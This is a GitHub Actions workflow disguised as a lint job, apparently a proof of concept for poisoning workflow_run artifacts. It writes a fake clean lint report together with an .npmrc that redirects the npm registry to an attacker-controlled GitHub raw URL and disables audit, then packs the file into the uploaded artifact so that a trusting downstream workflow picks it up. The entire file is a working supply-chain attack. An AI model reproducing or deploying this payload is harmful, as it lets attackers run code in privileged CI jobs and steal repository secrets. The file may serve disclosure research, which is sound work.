name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build linter report and attacker-controlled npm config
        run: |
          printf '%s\n' "${{ github.event.pull_request.number }}" > pr-number.txt
          printf 'No lint issues found.\n' > linter-report.txt
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg4/\naudit=false\nfund=false\n' > .npmrc
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            .npmrc
          include-hidden-files: true
          if-no-files-found: ignore
